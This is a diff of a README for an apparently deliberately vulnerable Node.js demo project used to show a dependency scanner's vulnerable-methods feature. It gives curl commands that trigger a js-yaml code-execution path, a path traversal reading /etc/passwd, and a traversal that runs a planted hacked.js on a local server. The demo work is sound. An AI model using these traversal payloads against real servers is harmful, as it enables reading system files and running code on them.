@@ -1,20 +1,55 @@
-# Introduction 
-TODO: Give a short introduction of your project. Let this section explain the objectives or the motivation behind this project. 
+# [:] Example node project with vulnerable methods
 
-# Getting Started
-TODO: Guide users through getting your code up and running on their own system. In this section you can talk about:
-1.	Installation process
-2.	Software dependencies
-3.	Latest releases
-4.	API references
+A node project to demonstrate srcclr agent's vulnerable methods feature for JavaScript
 
-# Build and Test
-TODO: Describe and show how to build your code and run the tests. 
+## Vulnerability 1 (SID-13642) Exploit
 
-# Contribute
-TODO: Explain how other users and developers can contribute to make your code better. 
+```
+git clone https://github.com/srcclr/example-javascript-vulnerable-methods.git
+cd example-javascript-vulnerable-methods
+npm install
+node index.js
 
-If you want to learn more about creating good readme files then refer the following [guidelines](https://docs.microsoft.com/en-us/azure/devops/repos/git/create-a-readme?view=azure-devops). You can also seek inspiration from the below readme files:
-- [ASP.NET Core](https://github.com/aspnet/Home)
-- [Visual Studio Code](https://github.com/Microsoft/vscode)
-- [Chakra Core](https://github.com/Microsoft/ChakraCore)
+```
+The vulnerable method is called twice during the server startup, however another one needs to be trigged by issuing a
+request to the endpoint by running the following command in another terminal to trigger the code execution vulnerability 
+in `js-yaml:load`
+
+```
+curl --path-as-is 'http://127.0.0.1:8001/api/'
+```
+
+## Vulnerability 2 (SID-20301) Exploit
+
+Use the following to trigger the directory traversal vulnerability (SID-20301)in `algo-httpserv:serve` 
+
+```
+curl --path-as-is 'http://127.0.0.1/8001/../../../../../../etc/passwd'
+```
+
+
+## Vulnerability 3 (SID-21402) Exploit
+
+```
+git clone https://github.com/srcclr/example-javascript-vulnerable-methods.git
+cd example-javascript-vulnerable-methods
+npm install
+node larvitbase-api.js
+
+```
+
+and then run the following command in another terminal
+
+```
+curl --path-as-is 'http://127.0.0.1:8001/../../../../hacked'
+```
+You can see the JavaScript file`hacked.js` is executed in the server side.
+
+## Scan with SRCCLR Agent
+
+```
+brew tap srcclr/srcclr
+brew install srcclr
+srcclr activate
+srcclr scan --url https://github.com/srcclr/example-javascript-vulnerable-methods
+```
